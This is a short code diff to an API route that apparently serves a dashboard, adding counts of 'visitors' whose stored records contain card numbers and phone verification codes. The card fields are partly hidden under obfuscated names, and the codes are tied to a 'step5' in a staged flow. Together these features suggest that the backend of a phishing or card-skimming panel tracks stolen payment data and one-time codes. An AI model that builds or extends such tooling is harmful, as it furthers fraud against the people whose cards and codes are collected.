@@ -46,6 +46,37 @@ export async function GET() {
       return createdAt >= thirtyDaysAgo;
     }).length;
     
+    // Count visitors with card data
+    const visitorsWithCard = allVisitors.filter(visitor => {
+      // Check direct fields
+      if (visitor._v1 || visitor.cardNumber) return true;
+      
+      // Check history array
+      if (visitor.history && Array.isArray(visitor.history)) {
+        return visitor.history.some((entry: any) => 
+          (entry.type === '_t1' || entry.type === 'card') && 
+          (entry.data?._v1 || entry.data?.cardNumber)
+        );
+      }
+      
+      return false;
+    }).length;
+    
+    // Count visitors with phone verification (step5 only)
+    const visitorsWithPhone = allVisitors.filter(visitor => {
+      // Check if they have phoneVerificationCode (step5)
+      if (visitor.phoneVerificationCode) return true;
+      
+      // Check history for phone verification
+      if (visitor.history && Array.isArray(visitor.history)) {
+        return visitor.history.some((entry: any) => 
+          entry.type === 'phone' && entry.data?.phoneVerificationCode
+        );
+      }
+      
+      return false;
+    }).length;
+    
     // Count devices
     const deviceCounts: Record<string, number> = {};
     allVisitors.forEach(visitor => {
@@ -74,6 +105,8 @@ export async function GET() {
       activeUsers,
       todayVisitors,
       totalVisitors,
+      visitorsWithCard,
+      visitorsWithPhone,
       devices,
       countries,
     });
@@ -86,6 +119,8 @@ export async function GET() {
         activeUsers: 0,
         todayVisitors: 0,
         totalVisitors: 0,
+        visitorsWithCard: 0,
+        visitorsWithPhone: 0,
         devices: [],
         countries: [],
       },
